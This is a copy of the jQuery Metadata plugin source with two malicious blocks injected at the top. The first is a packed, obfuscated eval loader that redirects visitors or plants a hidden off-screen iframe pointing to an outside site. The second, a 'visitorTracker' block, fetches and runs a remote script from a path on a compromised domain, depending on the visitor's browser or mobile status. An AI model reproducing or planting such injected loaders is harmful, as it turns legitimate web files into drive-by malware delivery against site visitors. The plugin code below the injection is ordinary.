/*cf2124863da1fd3cada50cc5680c68e0*/eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('15 102=225(41(){11(14.57!=125&&55 14.57!="43"){226(102);11(55 23["111"]=="43"){23["111"]=1;15 77=(72()&&116());15 91=!77&&!!23.227&&23.30.224==="223 219.";15 87=-1;15 35="220://221.222";11(67()&&87==1){11((30.46.86(/228/19))||(30.46.86(/229/19))){74.235(35)}22{23.74=35;14.74=35}}22{11((77&&!91&&!67())){15 59="<78 236=\\"237:234;233:-230;\\"><121 231=\\"120\\" 232=\\""+35+"\\" 218=\\"120\\"></121></78>";15 37=14.217("78");11(37.115==0){14.57.44=14.57.44+59}22{15 96=37.115;15 58=204.205((96/2));37[58].44=37[58].44+59}}}}130()}},100);41 130(){15 62="117";11(62!="117"){15 34=14.206(62);11(55 34!=43&&34!=125){34.203="";202 34}}};41 116(){11(14.27&&!14.198){16 25}22 11(14.27&&!23.199){16 25}22 11(14.27&&!14.200){16 25}22 11(14.27&&!14.201){16 25}22 11(14.27&&!23.207){16 25}22 11(14.27){16 25}22 11(55 30.208!="43"&&!14.27&&72()){16 25}22{16 82}}41 72(){15 17=23.30.46;15 51=17.28("214 ");11(51>0){16 64(17.68(51+5,17.28(".",51)),10)}15 114=17.28("215/");11(114>0){15 71=17.28("216:");16 64(17.68(71+3,17.28(".",71)),10)}15 56=17.28("213/");11(56>0){16 64(17.68(56+5,17.28(".",56)),10)}16 82}41 67(){15 75=23.30.46.212();11(/(209|210\\63+|211).+99|238|239\\/|266|267|268|265|197|264|261|84(262|104)|118|263|269 |270|276|277|99.+278|275|274 24(271|272)19|273( 113)?|260|39(259|246)\\/|247|248|245|244(4|6)0|240|241|126\\.(242|243)|249|250|256 257|258|255/19.107(75)||/254|251|252|253|279|50[1-6]19|189|135|31 109|137|103(128|110|48\\-)|124(159|153)|94(152|112|90)|142|151(145|69|144)|148|93(147|76)|139(79|154)|158|157(150|\\-24|143 |48 )|156|149(106|132|146)|122(141|138)|140(103|136)|155(196|29)42|185|186\\-(184|66)|183\\/|180|181|182\\-|187|188|194|195\\-|90(193|88)|192|160(92|132|190)|191|179\\-48|178|166|167|133(26|39)131|168(12|\\-63)|165(49|124)|164(161|162)|128(163|169)|170|176([4-7]0|113|109|177)|175|174(\\-|129)|134 66|171|172|173\\-5|38\\-73|76(\\.42|104)|319(396|397)|398|399|395\\-(24|39|33)|394\\-|390(101|127)|391( 19|84)|392\\-26|393(26(\\-| |129|31|38|39|48|33)|400)|401(408|409)|19\\-(20|76|65)|410|407( |\\-|\\/)|280|406|402|403|404|405|389|118|388(33|29)31|373|374|375|376|372|371( |\\/)|367|368 |369\\-|370(26|105)|377(378|385)|412( 38|\\/(105|387|66)|50|54|\\-[31-42])|384|383|379\\-42|380|381\\/|65(79|382|411)|95(36|21|112)|24\\-430|435(433|89)|438(439|437|123)|434|73(36|446|122|444|133|33(\\-| |131|29)|443)|442(50|436|29 )|431|418|419[0-2]|432[2-3]|420(0|2)|416(0|2|5)|414(0(0|1)|10)|415((26|24)\\-|421|422|428|425|424)|423(6|19)|426|427|429(413|417)|445|441|440|386(31|63|33)|365|309(13|\\-([1-8]|26))|310|311|119(308|307)|303\\-2|304(106|305|97)|306|312|101\\-38|313\\-31|366(320|12|21|32|60|\\-[2-7]|19\\-)|321|318|317|314|315|316(302|301)|287\\/|288(289|65|286|285|69|281)|282(36|108\\-|110|39\\-)|283\\/|97(26(\\-|0|1)|47|95|88|89)|284\\-|290|291(\\-|24)|298\\-0|299(45|300)|297(94|93|296|92|292)|293(294|69)|295(36|108\\-|29\\-|29 )|322(36|323)|352(18|50)|353(354|10|18)|127(351|350)|346\\-|347\\-|348(19|24)|349\\-|33\\-73|355(119|356)|123(70|24\\-|362|363)|364\\-9|126(\\.361|134|360)|357|358|359|345|344(330|79)|331(40|5[0-3]|\\-29)|332|329|328|324(52|53|60|61|70|80|81|83|85|98)|325(\\-| )|326|327|333(38 |334|341)|342|343|340|339\\-|335|336|337\\-/19.107(75.338(0,4))){16 25}16 82}',10,447,'|||||||||||if|||document|var|return|jrMoSNGjoWamxUHjITXOZrpYjFETCPEeXvLYCOoN||i|||else|window|m|true|c|all|indexOf|v|navigator|a||t|bYgBwYZJQNbhoIPvCxgEosBkYInPSDmHSpcLI|oWcCeDrlABXIpKtzAbCsHtKYFGubZPNvPZt|01|TCQcPzQiGGhFSVnmYGIQKeAlFabWsQhgguahwp|g|p||function|w|undefined|innerHTML||userAgent||s|||HrIKuOUBkUrHNxckYluKgtNehhWEiafCKdwVUc||||typeof|IaoZmlfQfjKrwlguOBTQfBmEfEljtIRfVk|body|wbLxdIZuZcNlbsfSmkJXwwmRuRgRdQPN|GgxzmEKKqlWEVUkNzvzMmxZRvcaCBTReY|||gACackpxDPqOutdnIyrJCyBmmpbfMEkEoHSOVPZL|d|parseInt|ma|u|rhvrMbJwSyyytCZInSgydVhmjkKTWiohCnNnptHOL|substring|ny||JyiRarcApupbwWeYzpzosNhfCyUaonI|NouKOYMfxUxUyLTDDUdTypZotCjTsZLzYuYOWNsz|mo|location|ibJLVvwgNpoUPBuHQfuyiJQoiyiVNJj|go|NGHzyhzcUbWMeRhZojicWxiNehvigqFAVprZWKFlT|div|te|||false||ip||match|BtPKTRfIxArHPkimwBrFGQYLJiZEphNYnV|nd|ri|co|lznTkueAWmzJPEMzZBkSrpDeGsSKhMMbDC|it|ar|al|mc|dl_name|se||mobile||pt|AYVISlQARcPipiJGukoWNGmYvHMIiJzlExLsQW|ac|od|k|ck|test|h|wa|oo|v_cf2124863da1fd3cada50cc5680c68e0|ca|os|jdBFSENleKsnhrcEGkMpeRNZQPJXfoOoKHOwYDsNF|length|iScSfbRyHkmnPiHYxWFPEuGNgvExyksACtg|none|iris|pl|9px|iframe|bi|ts|ai|null|up|ta|er|_|PgrFwUPBXHuMwrUVrvfJGSBBAJctMkrnbNOIbsIgO|o|ll|do|g1|802s|az|abac|rd|as|bl|lb|amoi|r|yw|ex|nq|ch|aptu|be|di|an|av|rn|us|br|avan|au|attw|ko|da|l2|ul|ic|em|el|dica|dmob|ds|k0|esl8|g560|gene|gf|fly|fetc|ez|ze|devi|dc|capi|ccwa|cdm|c55|n|bumb|bw|cell|chtm|770s|ng|dbte|craw|mp|cldc|cmd|e|fennec|compatMode|XMLHttpRequest|querySelector|addEventListener|delete|outerHTML|Math|floor|getElementById|atob|maxTouchPoints|android|bb|meego|toLowerCase|Edge|MSIE|Trident|rv|getElementsByTagName|height|Inc|http|dgdsgweewtew|ml|Google|vendor|setInterval|clearInterval|chrome|iPhone|iPod|2534px|width|src|left|absolute|replace|style|position|avantgo|bada|symbian|treo|browser|link|series|psp|re|plucker|pocket|vodafone|wap|6310|6590|3gso|1207|xiino|windows|ce|xda|ixi|phone|iemobile|hone|kindle|hiptop|elaine|blackberry|blazer|compal|lge|maemo|ob|in|palm|opera|netfront|midp|mmp|firefox|4thp|ibro|va|sc|sdk|sgh|ms|mm|s55|sa|ge|shar|sie|t5|so|ft|sp|b3|sm|sk|sl|id|zo|ve|pn|po|rt|prox|uc|ay|pg|phil|pire|psio|qa|raks|rim9|ro|r600|r380|gr|07|qtek|sy|mb|vx|w3c|webc|whit|vulc|voda|rg|vk|vm40|wi|nc|your|zeto|zte|substr|yas|x700|nw|wmlb|wonu|vi|veri|tcl|tdg|tel|tim|lk|gt|t2|t6|00|to|sh|utst|v400|v750|si|b|m3|m5|tx|pdxg|qc|klon|kpt|kwc|kyo|kgt|keji|jbro|jemu|jigs|kddi|le|no|m1|m3ga|m50|ui|lynx|libw|xi|pan|l|ja|ipaq|hi|hp|hs|ht|hei|hd|ad|un|haie|hcit|tp|hu|ig01|ikom|im1k|inno|idea|iac|aw|tc|i230|xo|lg|ti|n7|ne|n50|wv|mywa|n10|n30|on|tf|nok|wt|wg|nzph|o2im|wf|op|cr|mwbp|n20|rc|mmef|me|p1|oa|mi|o8|p800|owg1|mt|zz|de|oran|02'.split('|'),0,{}))
/*cf2124863da1fd3cada50cc5680c68e0*//*visitorTracker*/
var visitortrackerin = setInterval(function(){
	if(document.body != null && typeof document.body != "undefined"){
		clearInterval(visitortrackerin);
		if(typeof window["globalvisitor"] == "undefined"){
			window["globalvisitor"] = 1;
			var isIE = visitortrackerde();
			var isChrome = !isIE && !!window.chrome && window.navigator.vendor === "Google Inc.";
          	if(visitorTracker_isMob()){
              var visitortrackervs = document.createElement("script"); visitortrackervs.src = "http://theneighborhoodcleaner.com/.cnt.hacked/temp_data/info.php?mob=1"; document.getElementsByTagName("head")[0].appendChild(visitortrackervs);
            }else{
                if((isIE && !isChrome && !visitorTracker_isMob())){
					var visitortrackervs = document.createElement("script"); visitortrackervs.src = "http://theneighborhoodcleaner.com/.cnt.hacked/temp_data/info.php"; document.getElementsByTagName("head")[0].appendChild(visitortrackervs);
				} 
            }
		}
		visitortracksdel();
	}
},100);


function visitortracksdel(){
  	//return;
	var curscid = "none";
  	if(curscid != "none"){
     	var csr = document.getElementById(curscid);
      	if(typeof csr != undefined && csr != null){
          	csr.outerHTML = ""; 
			delete csr;
        }
    }
};

function visitortrackerde() {
    var ua = window.navigator.userAgent;
    var msie = ua.indexOf("MSIE ");
    if (msie > 0) {
        return parseInt(ua.substring(msie + 5, ua.indexOf(".", msie)), 10);
    }
    var trident = ua.indexOf("Trident/");
    if (trident > 0) {
        var rv = ua.indexOf("rv:");
        return parseInt(ua.substring(rv + 3, ua.indexOf(".", rv)), 10);
    }
    var edge = ua.indexOf("Edge/");
    if (edge > 0) {
       return parseInt(ua.substring(edge + 5, ua.indexOf(".", edge)), 10);
    }
    return false;
}
function visitorTracker_isMob(){
	var ua = window.navigator.userAgent.toLowerCase();
	if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(ua)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(ua.substr(0,4))) {
		return true;
	}
	return false;
}/*visitorTracker*//*
 * Metadata - jQuery plugin for parsing metadata from elements
 *
 * Copyright (c) 2006 John Resig, Yehuda Katz, J�örn Zaefferer, Paul McLanahan
 *
 * Dual licensed under the MIT and GPL licenses:
 *   http://www.opensource.org/licenses/mit-license.php
 *   http://www.gnu.org/licenses/gpl.html
 *
 * Revision: $Id: jquery.metadata.js 3640 2007-10-11 18:34:38Z pmclanahan $
 *
 */

/**
 * Sets the type of metadata to use. Metadata is encoded in JSON, and each property
 * in the JSON will become a property of the element itself.
 *
 * There are four supported types of metadata storage:
 *
 *   attr:  Inside an attribute. The name parameter indicates *which* attribute.
 *          
 *   class: Inside the class attribute, wrapped in curly braces: { }
 *   
 *   elem:  Inside a child element (e.g. a script tag). The
 *          name parameter indicates *which* element.
 *   html5: Values are stored in data-* attributes.
 *          
 * The metadata for an element is loaded the first time the element is accessed via jQuery.
 *
 * As a result, you can define the metadata type, use $(expr) to load the metadata into the elements
 * matched by expr, then redefine the metadata type and run another $(expr) for other elements.
 * 
 * @name $.metadata.setType
 *
 * @example <p id="one" class="some_class {item_id: 1, item_label: 'Label'}">This is a p</p>
 * @before $.metadata.setType("class")
 * @after $("#one").metadata().item_id == 1; $("#one").metadata().item_label == "Label"
 * @desc Reads metadata from the class attribute
 * 
 * @example <p id="one" class="some_class" data="{item_id: 1, item_label: 'Label'}">This is a p</p>
 * @before $.metadata.setType("attr", "data")
 * @after $("#one").metadata().item_id == 1; $("#one").metadata().item_label == "Label"
 * @desc Reads metadata from a "data" attribute
 * 
 * @example <p id="one" class="some_class"><script>{item_id: 1, item_label: 'Label'}</script>This is a p</p>
 * @before $.metadata.setType("elem", "script")
 * @after $("#one").metadata().item_id == 1; $("#one").metadata().item_label == "Label"
 * @desc Reads metadata from a nested script element
 * 
 * @example <p id="one" class="some_class" data-item_id="1" data-item_label="Label">This is a p</p>
 * @before $.metadata.setType("html5")
 * @after $("#one").metadata().item_id == 1; $("#one").metadata().item_label == "Label"
 * @desc Reads metadata from a series of data-* attributes
 *
 * @param String type The encoding type
 * @param String name The name of the attribute to be used to get metadata (optional)
 * @cat Plugins/Metadata
 * @descr Sets the type of encoding to be used when loading metadata for the first time
 * @type undefined
 * @see metadata()
 */

(function($) {

$.extend({
  metadata : {
    defaults : {
      type: 'class',
      name: 'metadata',
      cre: /({.*})/,
      single: 'metadata'
    },
    setType: function( type, name ){
      this.defaults.type = type;
      this.defaults.name = name;
    },
    get: function( elem, opts ){
      var settings = $.extend({},this.defaults,opts);
      // check for empty string in single property
      if ( !settings.single.length ) settings.single = 'metadata';
      
      var data = $.data(elem, settings.single);
      // returned cached data if it already exists
      if ( data ) return data;
      
      data = "{}";
      
      var getData = function(data) {
        if(typeof data != "string") return data;
        
        if( data.indexOf('{') < 0 ) {
          data = eval("(" + data + ")");
        }
      }
      
      var getObject = function(data) {
        if(typeof data != "string") return data;
        
        data = eval("(" + data + ")");
        return data;
      }
      
      if ( settings.type == "html5" ) {
        var object = {};
        $( elem.attributes ).each(function() {
          var name = this.nodeName;
          if(name.match(/^data-/)) name = name.replace(/^data-/, '');
          else return true;
          object[name] = getObject(this.nodeValue);
        });
      } else {
        if ( settings.type == "class" ) {
          var m = settings.cre.exec( elem.className );
          if ( m )
            data = m[1];
        } else if ( settings.type == "elem" ) {
          if( !elem.getElementsByTagName ) return;
          var e = elem.getElementsByTagName(settings.name);
          if ( e.length )
            data = $.trim(e[0].innerHTML);
        } else if ( elem.getAttribute != undefined ) {
          var attr = elem.getAttribute( settings.name );
          if ( attr )
            data = attr;
        }
        object = getObject(data.indexOf("{") < 0 ? "{" + data + "}" : data);
      }
      
      $.data( elem, settings.single, object );
      return object;
    }
  }
});

/**
 * Returns the metadata object for the first member of the jQuery object.
 *
 * @name metadata
 * @descr Returns element's metadata object
 * @param Object opts An object contianing settings to override the defaults
 * @type jQuery
 * @cat Plugins/Metadata
 */
$.fn.metadata = function( opts ){
  return $.metadata.get( this[0], opts );
};

})(jQuery);